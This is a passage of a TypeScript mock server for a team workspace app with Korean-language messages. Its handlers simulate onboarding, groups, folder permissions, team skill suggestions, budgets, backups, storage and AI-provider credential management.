        const g = (this.handlers.createGroup!({ ...c, body: { name, memberIds: [c.user.id] } }) as { body: Group }).body
        const folder = `groups/${g.name}`
        const notesFolder = `${folder}/${NOTES_FOLDER[this.settings.defaultLocale as keyof typeof NOTES_FOLDER] ?? NOTES_FOLDER.en}`
        for (const d of ['groups', folder, notesFolder]) this.files.set(d, this.files.get(d) ?? { type: 'folder', mtime: at })
        p.teamGroup = { id: g.id, name: g.name, folder, notesFolder }
      }
      // the brand folder (docs/DECISIONS.md "N"), also for a group recorded before it
      if (!p.teamGroup.brandFolder) {
        const brandFolder = `${p.teamGroup.folder}/${this.localized(PACK_FOLDERS.brand)}`
        this.files.set(brandFolder, this.files.get(brandFolder) ?? { type: 'folder', mtime: at })
        p.teamGroup = { ...p.teamGroup, brandFolder }
      }
      p.updatedAt = at
      return { progress: p, install, outcome: install ? 'installed' : 'already' }
    },
    // the first result, the company intro deck (server/src/onboarding/welcome-result.ts, short): the owner's files in
    // the brand folder, or a 회사 소개.md written there; a new chat of the owner's; the intro deck skill once for an
    // older row.
    // The mock collects no website images (images: []).
    startFirstResult: (c) => {
      const at = now()
      const p = this.welcome
      const g = p?.teamGroup
      if (!p || !p.general || !g?.brandFolder) fail('conflict', 409, '팀 폴더가 아직 없어요. 시작 설정을 다시 열어 주세요.')
      const files = (c.body as import('@mycel/shared/api').StartFirstResult).files
      for (const f of files) if (this.files.get(f)?.type !== 'file' || !f.startsWith(g!.brandFolder! + '/')) fail('not_found', 404)
      if (!p!.general!.introDeckPath) {
        for (const d of ['skills/general', 'skills/general/intro-deck']) this.files.set(d, this.files.get(d) ?? { type: 'folder', mtime: at })
        if (!this.files.has(GENERAL_DECK_SKILL)) this.putFile(GENERAL_DECK_SKILL, DECK_TEXT)
        p!.general = { ...p!.general!, introDeckPath: GENERAL_DECK_SKILL }
      }
      const imagesFolder = `${g!.brandFolder}/${this.localized(BRAND_IMAGES_FOLDER)}`
      this.files.set(imagesFolder, this.files.get(imagesFolder) ?? { type: 'folder', mtime: at })
      let intro: string | null = null
      if (!files.length) {
        intro = `${g!.brandFolder}/회사 소개.md`
        this.putFile(intro, `# 회사 소개\n\n${this.settings.teamName}${p!.site ? ` · ${p!.site}` : ''}\n`)
      }
      const chat = (this.handlers.createChat!({ ...c, body: { projectId: null, title: '우리 회사 소개서' } }) as { body: Chat }).body
      p!.updatedAt = at
      return { status: 201, body: { chatId: chat.id, title: chat.title, skillPath: p!.general!.introDeckPath!, files: intro ? [intro] : files, intro, imagesFolder, images: [] } }
    },
    // the one suggestion under a result (server/src/onboarding/suggestions.ts): none unless a test sets one
    // (/__test/result-suggestion); closing one keeps it closed
    // a team skill from the lead's answer (server/src/onboarding/skill-draft.ts, short): a draft chat of the caller,
    // running for its first read, then a card made from the source answer's files (meeting notes: "주간회의 할 일", the
    // notes folder and "the latest", the choice 내 할 일 / 사람별); sharing writes the skill as the caller
    startSkillDraft: (c) => {
      // (the mock's chats carry no owner: every chat is the signed-in person's)
      if (!this.chats.some((x) => x.id === c.body.chatId)) fail('not_found', 404)
      const had = [...this.skillDrafts].find(([, d]) => d.sourceChatId === c.body.chatId && d.userId === c.user.id && !d.saved)
      if (had) return { status: 201, body: { draftChatId: had[0] } }
      const id = uuidv7()
      this.skillDrafts.set(id, { userId: c.user.id, sourceChatId: c.body.chatId, reads: 0, saved: null })
      return { status: 201, body: { draftChatId: id } }
    },
    getSkillDraft: (c) => {
      const d = this.skillDrafts.get(c.params.chatId)
      if (!d || d.userId !== c.user.id) fail('not_found', 404)
      const saved = d!.saved ? { path: d!.saved, name: d!.saved.split('/').at(-2)!, title: this.skillsFor(c.user).find((x) => x.path === d!.saved)?.title ?? '' } : null
      if (++d!.reads < 2) return { status: 'running', draft: null, problem: null, saved }
      return { status: 'done', draft: this.skillCard(d!.sourceChatId), problem: null, saved }
    },
    saveSkillDraft: (c) => {
      const d = this.skillDrafts.get(c.params.chatId)
      if (!d || d.userId !== c.user.id) fail('not_found', 404)
      if (d!.saved) return { path: d!.saved, name: d!.saved.split('/').at(-2)!, title: c.body.title }
      const card = this.skillCard(d!.sourceChatId)
      const name = card.inputs.length ? 'juganhoeui-hal-il' : 'gyeonjeokseo-sseugi'
      const rel = `skills/general/${name}/SKILL.md`
      for (const dir of ['skills', 'skills/general', `skills/general/${name}`]) this.files.set(dir, this.files.get(dir) ?? { type: 'folder', mtime: now() })
      const inputs = card.inputs.length ? `  inputs: |\n    ${JSON.stringify(card.inputs)}\n` : ''
      this.putFile(rel, `---\nname: ${name}\ndescription: "${c.body.title} — ${card.description}"\nmetadata:\n  title: "${c.body.title}"\n${inputs}${card.recurring ? '  recurring: weekly\n' : ''}---\n# ${c.body.title}\n`)
      this.skillMakers.set(rel, c.user.id)
      d!.saved = rel
      return { path: rel, name, title: c.body.title }
    },
    getResultSuggestion: () => ({ suggestion: this.resultSuggestion && !this.closedSuggestions.has(this.resultSuggestion.key) ? this.resultSuggestion : null }),
    dismissSuggestion: (c) => { this.closedSuggestions.add((c.body as { key: string }).key) },
    // onboarding G: no 7-day team goal card unless a test sets one (/__test/team-goal); Home then shows the owner checklist
    getTeamGoal: () => ({ goal: this.teamGoal }),
    // members as the server counts them (group_members): those the group lists and those whose groups name it
    listGroups:() => ({ items: this.groups.map((g) => ({ ...g, memberIds: [...new Set([...g.memberIds, ...this.users.filter((u) => u.groupIds.includes(g.id)).map((u) => u.id)])] })) }),
    createGroup: (c) => {
      const g: Group = { id: uuidv7(), name: c.body.name, description: c.body.description ?? null, memberIds: c.body.memberIds ?? [] }
      this.groups.push(g)
      // like the server: groups/<name>/ with "this group writes", tied to the group (Folder.groupId)
      const f: Folder = { id: uuidv7(), path: `groups/${g.name}`, exists: true, createdAt: now(), rules: [], groupId: g.id }
      f.rules = [{ id: uuidv7(), folderId: f.id, subjectType: 'group', subjectId: g.id, access: 'write', updatedBy: { id: c.user.id, name: c.user.name }, updatedAt: now() }]
      this.folders.push(f)
      this.files.set('groups', { type: 'folder', mtime: now() })
      this.files.set(f.path, { type: 'folder', mtime: now() })
      return { status: 201, body: g }
    },
    updateGroup: (c) => Object.assign(this.groups.find((g) => g.id === c.params.id) ?? fail('not_found', 404), Object.fromEntries(Object.entries(c.body).filter(([, v]) => v !== undefined))),
    deleteGroup: (c) => {
      this.groups = this.groups.filter((g) => g.id !== c.params.id)
      // its rules go; its folder row stays, no longer a group's (the server's deleteGroup)
      for (const f of this.folders) {
        f.rules = f.rules.filter((r) => !(r.subjectType === 'group' && r.subjectId === c.params.id))
        if (f.groupId === c.params.id) f.groupId = null
      }
      return undefined
    },
    // like the server (admin/folder-keep.ts, the mock's names are case-sensitive): rows parked with a trashed folder are
    // not listed, and each row says why the API keeps it
    listFolders: () => ({ items: this.folders.filter((f) => !isParkedRow(f.path)).map((f) => ({ ...f, exists: f.path === '' || this.files.get(f.path)?.type === 'folder', keep: folderKeep(f.path, f.groupId ?? null, false), hidden: shownSegs(f.path) === null, rulesHash: rulesHash(f.rules) })) }),
    // ---- team skills ----
    listSkillManagers: () => this.skillManagersResponse(),
    setSkillManager: (c) => {
      const { subjectType, subjectId, enabled } = c.body as { subjectType: 'user' | 'group'; subjectId: string; enabled: boolean }
      const p = (c.body.path as string) ?? 'skills'
      const u = this.users.find((x) => x.id === subjectId)
      if (subjectType === 'user' && (!u || u.role !== 'member')) fail('validation', 400, '팀장·관리자는 항상 팀 스킬을 관리해요.')
      if (!(p === 'skills' || p.startsWith('skills/'))) fail('validation', 400, 'skills/ 안의 볼 수 있는 폴더를 골라 주세요.')
      this.skillManagers = this.skillManagers.filter((g) => !(g.subjectType === subjectType && g.subjectId === subjectId && g.path === p))
      if (enabled) this.skillManagers.push({ subjectType, subjectId, path: p })
      if (enabled && !this.files.has(p)) this.files.set(p, { type: 'folder', mtime: now() })
      // the same rule Admin > 폴더 권한 shows
      let f = this.folders.find((x) => x.path === p)
      if (!f && enabled) {
        f = { id: uuidv7(), path: p, exists: true, createdAt: now(), rules: [{ id: uuidv7(), folderId: '', subjectType: 'everyone', subjectId: null, access: 'read', updatedBy: null, updatedAt: now() }] }
        f.rules[0]!.folderId = f.id
        this.folders.push(f)
      }
      if (f) {
        f.rules = f.rules.filter((r) => !(r.subjectType === subjectType && r.subjectId === subjectId))
        if (enabled) f.rules.push({ id: uuidv7(), folderId: f.id, subjectType, subjectId, access: 'write', updatedBy: { id: c.user.id, name: c.user.name }, updatedAt: now() })
        // like the server: skills/ keeps a rule ("admins: write", which changes nobody's access)
        if (!f.rules.length && p === 'skills') f.rules.push({ id: uuidv7(), folderId: f.id, subjectType: 'role', subjectId: 'admin', access: 'write', updatedBy: { id: c.user.id, name: c.user.name }, updatedAt: now() })
      }
      return this.skillManagersResponse()
    },
    listSkillChanges: () => ({ items: this.skillChanges, nextCursor: null }),
    skillsOverview: (c) => ({
      managedFolders: this.managed(c.user),
      suggestFolders: ['skills', 'skills/재무'],
      pendingReview: this.suggestions.filter((s) => s.status === 'pending' && this.manages(c.user, s.targetFolder)).length,
      myPending: this.suggestions.filter((s) => s.status === 'pending' && s.suggester.id === c.user.id).length,
      ...(this.aiList ? { aiList: this.aiList } : {}),
    }),
    listSkillSuggestions: (c) => ({
      items: this.suggestions.filter((s) => (c.query.scope === 'review' ? this.manages(c.user, s.targetFolder) : s.suggester.id === c.user.id)).map((s) => this.suggestionFor(s, c.user)),
      nextCursor: null,
    }),
    getSkillSuggestion: (c) => {
      const s = this.suggestions.find((x) => x.id === c.params.id)
      if (!s || !(s.suggester.id === c.user.id || this.manages(c.user, s.targetFolder))) fail('not_found', 404)
      return this.suggestionFor(s!, c.user)
    },
    createSkillSuggestion: (c) => {
      const src = c.body.source as { kind: 'message'; chatId: string; messageId: string } | { kind: 'file'; path: string }
      if (src.kind === 'message' && !this.messages.some((m) => m.id === src.messageId && m.chatId === src.chatId && this.chats.some((ch) => ch.id === src.chatId))) fail('not_found', 404)
      if (src.kind === 'file' && !src.path.startsWith(`users/${c.user.id}/`)) fail('not_found', 404)
      const s: SkillSuggestion = {
        id: uuidv7(), status: 'pending', targetFolder: c.body.targetFolder ?? 'skills', name: c.body.name, description: c.body.description ?? '', content: c.body.content,
        source: { kind: src.kind, path: src.kind === 'file' ? src.path : null }, suggester: { id: c.user.id, name: c.user.name }, reviewer: null, reviewNote: null, resultPath: null,
        createdAt: now(), reviewedAt: null, canReview: false,
      }
      this.suggestions.unshift(s)
      this.publish({ type: 'notice', data: { level: 'info', code: 'skill_suggested', message: `${c.user.name} 님이 스킬을 제안했어요: ${s.name} → ${s.targetFolder}/`, link: `/skills?review=${s.id}` } })
      return { status: 201, body: this.suggestionFor(s, c.user) }
    },
    approveSkillSuggestion: (c) => {
      const s = this.suggestions.find((x) => x.id === c.params.id)
      if (!s || !(s.suggester.id === c.user.id || this.manages(c.user, s.targetFolder))) fail('not_found', 404)
      if (!this.manages(c.user, s!.targetFolder) || !this.manages(c.user, c.body.targetFolder)) fail('forbidden', 403, '이 폴더의 팀 스킬을 관리할 권한이 없어요.')
      if (s!.status !== 'pending') fail('conflict', 409, '이미 처리된 제안이에요.')
      const file = `${c.body.targetFolder}/${(c.body.fileName ?? c.body.name).trim().replace(/\s+/g, '-')}.md`
      this.putFile(file, `---\nname: ${JSON.stringify(c.body.name)}\ndescription: ${JSON.stringify(c.body.description ?? '')}\n---\n${c.body.content}`)
      Object.assign(s!, { status: 'approved', reviewer: { id: c.user.id, name: c.user.name }, reviewedAt: now(), resultPath: file, targetFolder: c.body.targetFolder, name: c.body.name, description: c.body.description, content: c.body.content })
      this.skillChange({ id: uuidv7(), at: now(), actor: { id: c.user.id, name: c.user.name }, path: file, change: 'create', from: null, byAi: false, kind: 'skill' })
      this.publish({ type: 'notice', data: { level: 'info', code: 'skill_suggestion_reviewed', message: `제안한 스킬이 등록됐어요: ${s!.name} (${file})`, link: `/skills?mine=${s!.id}` } })
      return this.suggestionFor(s!, c.user)
    },
    rejectSkillSuggestion: (c) => {
      const s = this.suggestions.find((x) => x.id === c.params.id)
      if (!s || !(s.suggester.id === c.user.id || this.manages(c.user, s.targetFolder))) fail('not_found', 404)
      if (!this.manages(c.user, s!.targetFolder)) fail('forbidden', 403)
      if (s!.status !== 'pending') fail('conflict', 409)
      Object.assign(s!, { status: 'rejected', reviewer: { id: c.user.id, name: c.user.name }, reviewedAt: now(), reviewNote: c.body.note || null })
      this.publish({ type: 'notice', data: { level: 'info', code: 'skill_suggestion_reviewed', message: `제안한 스킬이 거절됐어요: ${s!.name}`, link: `/skills?mine=${s!.id}` } })
      return this.suggestionFor(s!, c.user)
    },
    createFolder: (c) => {
      if (isTeamDefaultFolder(c.body.path, false) && !c.body.rules?.length) fail('validation', 400, serverMsg('teamFolderKeepsRules', c.user.locale), { 'body.rules': 'shared/ and skills/ keep at least one rule' })
      // like the server: rules made there meanwhile (the hash the editor started from is not the rules' now)
      if (c.body.expectedHash !== undefined && c.body.expectedHash !== rulesHash(this.folders.find((f) => f.path === c.body.path)?.rules ?? [])) throw new Fail('conflict', 409, serverMsg('rulesChanged', c.user.locale), undefined, { reason: 'rules_changed' })
      // like the server (create defaults to true): the folder and those above it are made
      if (c.body.create !== false) for (let i = 1, parts = String(c.body.path).split('/'); c.body.path && i <= parts.length; i++) { const d = parts.slice(0, i).join('/'); if (!this.files.has(d)) this.files.set(d, { type: 'folder', mtime: now() }) }
      const f: Folder = { id: uuidv7(), path: c.body.path, exists: c.body.path === '' || this.files.get(c.body.path)?.type === 'folder', createdAt: now(), rules: [] }
      f.rules = (c.body.rules ?? []).map((r: Json) => ({ id: uuidv7(), folderId: f.id, subjectType: r.subjectType, subjectId: r.subjectId ?? null, access: r.access, updatedBy: { id: c.user.id, name: c.user.name }, updatedAt: now() }))
      this.folders.push(f)
      return { status: 201, body: { ...f, rulesHash: rulesHash(f.rules) } }
    },
    putFolderRules: (c) => {
      const f = this.folders.find((x) => x.id === c.params.id && !isParkedRow(x.path)) ?? fail('not_found', 404)
      if (isTeamDefaultFolder(f.path, false) && !c.body.rules.length) fail('validation', 400, serverMsg('teamFolderKeepsRules', c.user.locale), { 'body.rules': 'shared/ and skills/ keep at least one rule' })
      // like the server: another admin changed the rules since the editor read them
      if (c.body.expectedHash !== undefined && c.body.expectedHash !== rulesHash(f.rules)) throw new Fail('conflict', 409, serverMsg('rulesChanged', c.user.locale), undefined, { reason: 'rules_changed' })
      f.rules = c.body.rules.map((r: Json) => ({ id: uuidv7(), folderId: f.id, subjectType: r.subjectType, subjectId: r.subjectId ?? null, access: r.access, updatedBy: { id: c.user.id, name: c.user.name }, updatedAt: now() }))
      return { ...f, exists: f.path === '' || this.files.get(f.path)?.type === 'folder', keep: folderKeep(f.path, f.groupId ?? null, false), hidden: shownSegs(f.path) === null, rulesHash: rulesHash(f.rules) }
    },
    deleteFolder: (c) => {
      const f = this.folders.find((x) => x.id === c.params.id && !isParkedRow(x.path)) ?? fail('not_found', 404)
      // the server refuses these at the admin API (routes/admin.ts): shared/ and skills/, and a group's folder
      const keep = folderKeep(f.path, f.groupId ?? null, false)
      if (keep === 'team') fail('conflict', 409, serverMsg('teamFolderKeepsRules', c.user.locale))
      if (keep === 'group') fail('conflict', 409, serverMsg('groupFolderKeepsRow', c.user.locale))
      this.folders = this.folders.filter((x) => x.id !== f.id)
      return undefined
    },
    explainFolderAccess: (c) => this.explainFolder(c.query),
    explainPersonAccess: (c) => {
      const u = this.users.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      return this.explainPerson({ user: u, role: u.role, groupIds: u.groupIds }, { prefix: c.query.prefix, cursor: c.query.cursor, limit: c.query.limit ? Number(c.query.limit) : undefined })
    },
    explainAccessTree: (c) => this.explainTree(c.query),
    previewFolderEdit: (c) => this.explainEdit(c.body, c.user.locale),
    explainNewPersonAccess: (c) => {
      if ((c.body.groupIds as string[]).some((g) => !this.groups.some((x) => x.id === g))) fail('validation', 400, '없는 그룹이 들어 있어요.', { 'body.groupIds': 'unknown group' })
      return this.explainPerson({ user: null, role: c.body.role, groupIds: [...new Set(c.body.groupIds as string[])] }, c.body)
    },
    previewRules: (c) => ({
      folders: c.body.changes.map((ch: Json) => ({ path: ch.path, users: this.users.map((u) => ({ user: { id: u.id, name: u.name }, role: u.role, before: u.role === 'owner' ? 'write' : 'none', after: u.role === 'owner' ? 'write' : (ch.rules as Json[]).some((r) => r.subjectType === 'everyone') ? 'read' : 'none' })) })),
      losing: [{ user: { id: 'bob', name: 'Bob' }, paths: [c.body.changes[0].path], chatsReset: 2 }],
    }),
    engines: () => this.enginesResponse(),
    updateEngines: (c) => {
      if (c.body.defaultEngine) this.settings.defaultEngine = c.body.defaultEngine
      if (c.body.concurrency) this.settings.concurrency = c.body.concurrency
      if (c.body.enabled?.codex !== undefined) this.codexEnabled = c.body.enabled.codex
      if (c.body.enabled?.api !== undefined) this.apiEngineEnabled = c.body.enabled.api
      if (c.body.limitFallback === true && !this.codexEnabled) fail('conflict', 409, 'Codex가 꺼져 있어 한도 대체를 켤 수 없어요.')
      if (c.body.limitFallback !== undefined) this.limitFallback = c.body.limitFallback
      if (!this.codexEnabled) this.limitFallback = false
      if (c.body.memberChoice) this.memberChoice = c.body.memberChoice
      this.publish({ type: 'notice', data: { level: 'info', code: 'engine_choice_changed', message: '' } })
      return this.enginesResponse()
    },
    checkEngine: (c) => this.enginesResponse().engines.find((e) => e.id === c.params.id) ?? fail('not_found', 404),
    // the team's API engine: not set up (like a fresh server)
    getApiEngine: () => ({ baseUrl: null, model: null, label: null, hasKey: false }),
    putApiEngine: (c) => ({ baseUrl: c.body.baseUrl, model: c.body.model, label: c.body.label ?? null, hasKey: !!c.body.key }),
    listBudgets: () => ({ items: this.budgets }),
    createBudget: (c) => {
      const b: Budget = { id: uuidv7(), subjectType: c.body.subjectType, subjectId: c.body.subjectId, period: c.body.period, limitUsd: c.body.limitUsd, limitTokens: c.body.limitTokens ?? null, action: c.body.action, usedUsd: 0, usedTokens: 1234 }
      this.budgets.push(b)
      return { status: 201, body: b }
    },
    updateBudget: (c) => Object.assign(this.budgets.find((b) => b.id === c.params.id) ?? fail('not_found', 404), c.body),
    deleteBudget: (c) => {
      this.budgets = this.budgets.filter((b) => b.id !== c.params.id)
      return undefined
    },
    settings: () => this.settings,
    // SpeechKeyStatus.hosted (0.2.17): the hosting service's free hours; none on this mock server
    speechKey: () => ({ ...this.speechKey, hosted: null }),
    speechHost: () => this.speechHost,
    setSpeechKey: (c) => {
      this.speechKey = c.body.sealed ? { set: true, hint: 'mock', updatedAt: now() } : { set: false, hint: null, updatedAt: null }
      return { ...this.speechKey, hosted: null }
    },
    updateSettings: (c) => {
      const before = this.settings.defaultLocale
      const policyBefore = this.settings.browserAllowAll
      // like server/src/admin/settings.ts: a new speech provider starts "Turn video sound into text" from its default
      const providerChanged = c.body.speechProvider !== undefined && c.body.speechProvider !== this.settings.speechProvider
      Object.assign(this.settings, c.body)
      if (providerChanged && c.body.aiMediaTranscripts === undefined) this.settings.aiMediaTranscripts = null
      this.syncLocales()
      if (this.settings.defaultLocale !== before) this.publish(LOCALE_CHANGED)
      if (this.settings.browserAllowAll !== policyBefore) this.publish(BROWSER_POLICY_CHANGED)
      return this.settings
    },
    // like server/src/admin/team-icon.ts: the same checks (shared/src/team-icon.ts) and words
    putTeamIcon: async (c) => {
      const bytes = new Uint8Array(await c.req.arrayBuffer())
      const r = bytes.byteLength > TEAM_ICON_MAX_BYTES ? ({ ok: false, problem: 'too_big' } as const) : checkTeamIcon(bytes, c.query.type)
      if (!r.ok) {
        const message = TEAM_ICON_TEXT[r.problem].ko
        if (r.problem === 'too_big') fail('payload_too_large', 413, message)
        throw new Fail('validation', 400, message, { body: r.problem }, { reason: r.problem })
      }
      this.teamIcon = { bytes, type: r.type, width: r.width, height: r.height, version: sha256Hex(bytes).slice(0, 16) }
      this.publish(TEAM_ICON_CHANGED)
      return { version: this.teamIcon.version, type: r.type, width: r.width, height: r.height, size: bytes.byteLength }
    },
    deleteTeamIcon: () => {
      if (this.teamIcon) this.publish(TEAM_ICON_CHANGED)
      this.teamIcon = null
      return undefined
    },
    usage: (c) => ({ from: c.query.from ?? now(), to: c.query.to ?? now(), rows: c.query.groupBy === 'skill'
      ? [{ key: 'skills/report.md', label: '주간 보고서', turns: 12, inputTokens: 12000, outputTokens: 3400, costUsd: 0.42 }]
      : c.query.groupBy === 'model'
        ? [{ key: 'model-test', label: 'model-test', turns: 15, inputTokens: 14000, outputTokens: 4100, costUsd: 0.47 }]
        : [{ key: 'olga', label: 'Olga', turns: 12, inputTokens: 12000, outputTokens: 3400, costUsd: 0.42 }, { key: 'bob', label: 'Bob', turns: 3, inputTokens: 2000, outputTokens: 700, costUsd: 0.05 }],
      totals: { turns: 15, inputTokens: 14000, outputTokens: 4100, costUsd: 0.47 } }),
    // like server/src/admin/audit.ts listAudit: newest first, filtered by kind, person, path (file events only) and
    // [from, to); paged by an index cursor. Made-up rows: today's invite first, repeats, a refused AI tool call, a team
    // skill change yesterday, and a sign-in every day before that (enough to scroll and to need "Load more").
    audit: (c) => {
      const f = c.query
      const rows = auditRows().filter((e) => (!f.source || e.source === f.source) && (!f.actor || e.actor?.id === f.actor)
        && (f.path === undefined || (e.source === 'file' && (e.target === f.path || (e.target ?? '').startsWith(f.path + '/'))))
        && (!f.from || e.at >= new Date(f.from).toISOString()) && (!f.to || e.at < new Date(f.to).toISOString()))
      const start = f.cursor ? Number(f.cursor) : 0
      const limit = Number(f.limit ?? 50)
      const items = rows.slice(start, start + limit)
      return { items, nextCursor: start + limit < rows.length ? String(start + limit) : null }
    },
    diagnostics: () => ({ version: this.serverVersion, host: { os: 'darwin', arch: 'arm64', hostname: 'mac-mini' }, disk: { teamFolderFreeBytes: 500e9, dataFreeBytes: 500e9 }, queue: { running: 0, queued: 0, concurrency: 2 }, checks: [{ id: 'relay', group: 'relay', label: 'Relay connection', status: 'warn', detail: 'Relay not configured (dev)' }, { id: 'disk', group: 'disk', label: 'Disk space', status: 'ok', detail: null }], generatedAt: now() }),
    updateStatus: () => ({ current: this.serverVersion, channel: 'stable', available: null, lastCheckedAt: now(), previous: null, managed: this.cloud }),
    // like server/src/system/after-update.ts: the HWP plugin to-do while the plugin is not on and not dismissed
    afterUpdateActions: () => ({
      items: this.afterDismissed.includes('hwp-plugin') || this.plugins.installed.some((p) => p.id === 'app.trina.hwp-preview' && p.enabled) ? [] : [{ id: 'hwp-plugin', since: '0.4.0-beta.2', to: '/admin/plugins?focus=app.trina.hwp-preview' }],
    }),
    dismissAfterUpdate: (c) => { if (c.params.id !== 'hwp-plugin') fail('not_found', 404); if (!this.afterDismissed.includes(c.params.id)) this.afterDismissed.push(c.params.id); return undefined },
    // like server/src/system/storage.ts: a 50 GB disk, 41 GB used (over 80%); the plan on Team AX Cloud
    storage: () => ({
      totalBytes: 50 * 1024 ** 3, usedBytes: 41 * 1024 ** 3, freeBytes: 9 * 1024 ** 3, percent: 82, level: 'warn', reserveBytes: 1024 ** 3, writesRefused: false, graceEndsAt: null,
      breakdown: { team: 30 * 1024 ** 3, history: 4 * 1024 ** 3, trash: 3 * 1024 ** 3, backups: 2 * 1024 ** 3, models: 0.5 * 1024 ** 3, data: 0.3 * 1024 ** 3, app: 0.2 * 1024 ** 3, other: 1024 ** 3 },
      measuredAt: now(), planDiskGiB: this.cloud ? 50 : null,
    }),
    // like server/src/system/managed.ts: the plan card and the operator's notices on Team AX Cloud (none self-hosted)
    plan: (c) => ({
      plan: this.cloud ? {
        id: 'team', name: ({ ko: '팀', en: 'Team', id: 'Tim', ja: 'チーム', es: 'Equipo' } as Record<string, string>)[c.user.locale ?? 'ko'] ?? 'Team', maxConcurrency: 3, concurrency: Math.min(3, this.settings.concurrency),
        maxActiveMembers: 12, activeMembers: this.users.filter((u) => u.status === 'active').length, diskGiB: 50, memoryMiB: 4096, cpuCores: 3,
        localBackupRetentionDays: 3, links: { account: 'https://app.teamax.example/billing', status: 'https://status.teamax.example', support: 'support@teamax.example' },
        updatedAt: now(),
      } : null,
    }),
    managedNotices: (c) => ({
      items: !this.cloud ? [] : [
        ...(c.user.role === 'owner' ? [{ id: 'grant-1', level: 'critical' as const, text: '지원팀이 11월 6일 18시까지 진단 접근 권한을 가지고 있어요', link: null, until: null, dismissible: false }] : []),
        { id: 'maint-1', level: 'info' as const, text: '오늘 밤 2시에 점검이 있어요', link: 'https://status.teamax.example', until: null, dismissible: true },
      ],
    }),
    listBackups: () => ({ items: [{ id: 'b1', kind: 'daily', createdAt: now(), size: 123456, scope: 'full' }] }),
    startBackup: (c) => {
      const id = uuidv7()
      const job: Job = { id, kind: 'backup', status: 'running', progress: 0, message: 'Backing up', result: null, error: null, createdAt: now(), finishedAt: null }
      this.jobs.set(id, job)
      setTimeout(() => this.publish({ type: 'job.progress', data: { jobId: id, kind: 'backup', progress: 0.5, message: 'Copying database' } }), 50)
      setTimeout(() => {
        Object.assign(job, { status: 'done', progress: 1, result: { backupId: 'b2', size: 999, createdAt: now() }, finishedAt: now() })
        this.publish({ type: 'job.done', data: { job } })
      }, 200)
      void c
      return { status: 202, body: { jobId: id } }
    },
    connection: () => this.connection,
    updateConnection: (c) => {
      if (c.body.password !== OWNER_PASSWORD) fail('forbidden', 403)
      if (!(this.connection.availableModes ?? []).includes(c.body.mode)) fail('conflict', 409, 'This connection mode is not available in this version yet.')
      if (c.body.mode !== 'direct-only' && !(c.body.teamName ?? this.connection.teamName)) fail('validation', 400)
      this.connection = { ...this.connection, mode: c.body.mode, teamName: c.body.teamName ?? this.connection.teamName, state: c.body.mode === 'direct-only' ? 'disabled' : 'connecting', detail: 'Applies after the server restarts.' }
      return this.connection
    },
    // like a server outside office mode (no automatic office updates)
    officeUpdateStatus: () => null,
    officeUpdateAction: () => fail('conflict', 409, '사무실 모드가 아니라 자동 업데이트가 없어요.'),
    // ---------------- AI connections (like server/src/routes/credentials.ts) ----------------
    listCredentials: () => ({ items: this.credentials.map((c) => this.credentialView(c)), memberOwn: this.credMemberOwn, sharedSubscriptions: this.credSharedSubscriptions, allowedKinds: ['anthropic-oauth', 'anthropic-api-key', 'chatgpt', 'openai-api-key'], pricesAsOf: '2026-10-22' }),
    sealingKey: () => this.sealer.publicKey(),
    createCredential: async (c) => {
      if (c.body.password !== OWNER_PASSWORD) fail('forbidden', 403, '비밀번호가 맞지 않아요.', { 'body.password': 'wrong password' })
      return { status: 201, body: await this.addCredential(c.user, c.body, false) }
    },
    createMyCredential: async (c) => {
      if (!this.credMemberOwn) fail('forbidden', 403)
      return { status: 201, body: await this.addCredential(c.user, c.body, true) }
    },
    updateCredential: (c) => {
      const x = this.credentials.find((y) => y.id === c.params.id) ?? fail('not_found', 404)
      if (c.body.label !== undefined) x.label = c.body.label
      if (c.body.priority !== undefined) x.priority = c.body.priority
      if (c.body.disabled !== undefined) { x.disabled = c.body.disabled; x.state = x.disabled ? 'disabled' : 'ok' }
      if (c.body.assignments) x.assignments = c.body.assignments.map((a: { subjectType: 'group' | 'user'; subjectId: string }) => ({ ...a, name: a.subjectType === 'group' ? this.groups.find((g) => g.id === a.subjectId)?.name ?? a.subjectId : this.users.find((u) => u.id === a.subjectId)?.name ?? a.subjectId }))
      if (c.body.spendLimit) x.spendLimit = c.body.spendLimit
      this.credentials.sort((a, b) => a.priority - b.priority)
      return x
    },
    replaceCredentialSecret: async (c) => {
      if (c.body.password !== OWNER_PASSWORD) fail('forbidden', 403)
      const x = this.credentials.find((y) => y.id === c.params.id) ?? fail('not_found', 404)
      await this.sealer.unseal(c.body.sealed, 'credential.replace').catch(() => fail('validation', 400))
      x.state = 'ok'; x.detail = null
      return x
    },
    deleteCredential: (c) => {
      if (!this.credentials.some((x) => x.id === c.params.id)) fail('not_found', 404)
      this.credentials = this.credentials.filter((x) => x.id !== c.params.id)
      return undefined
    },
    deleteMyCredential: (c) => {
      const x = this.credentials.find((y) => y.id === c.params.id && y.owner?.id === c.user.id) ?? fail('not_found', 404)
      this.credentials = this.credentials.filter((y) => y.id !== x.id)
      return undefined
    },
    checkCredential: (c) => {
      const x = this.credentials.find((y) => y.id === c.params.id) ?? fail('not_found', 404)
      if (x.state === 'unverified') { x.state = 'ok'; x.detail = null; x.checkedAt = now() }
      return x
    },
    updateCredentialSettings: (c) => {
      if (c.body.sharedSubscriptions === true && !this.credSharedSubscriptions && c.body.acknowledgedSharedSubscriptionRisk !== true) fail('validation', 400)
      if (c.body.memberOwn !== undefined) this.credMemberOwn = c.body.memberOwn
      if (c.body.sharedSubscriptions !== undefined) this.credSharedSubscriptions = c.body.sharedSubscriptions
      return { memberOwn: this.credMemberOwn, sharedSubscriptions: this.credSharedSubscriptions }
    },
    myCredentials: (c) => ({ allowed: this.credMemberOwn, allowedKinds: ['anthropic-oauth', 'anthropic-api-key', 'chatgpt', 'openai-api-key'], items: this.credentials.filter((x) => x.owner?.id === c.user.id) }),
    startCredentialLogin: (c) => {
      if (!this.credSharedSubscriptions) fail('forbidden', 403)
      if (c.body.password !== OWNER_PASSWORD) fail('forbidden', 403)
      return { status: 202, body: this.startLogin(c.user, c.body.label, false, c.body.reconnectId, c.body.kind) }
    },
    startMyCredentialLogin: (c) => {
      if (!this.credMemberOwn) fail('forbidden', 403)
      return { status: 202, body: this.startLogin(c.user, c.body.label, true, c.body.reconnectId, c.body.kind) }
    },
    submitCredentialLoginCode: (c) => this.loginCode(c.params.id, c.user, c.body.sealed),
    submitMyCredentialLoginCode: (c) => this.loginCode(c.params.id, c.user, c.body.sealed),
    getCredentialLogin: (c) => this.loginOf(c.params.id, c.user),
    getMyCredentialLogin: (c) => this.loginOf(c.params.id, c.user),
    cancelCredentialLogin: (c) => { this.cancelLogin(c.params.id, c.user); return undefined },
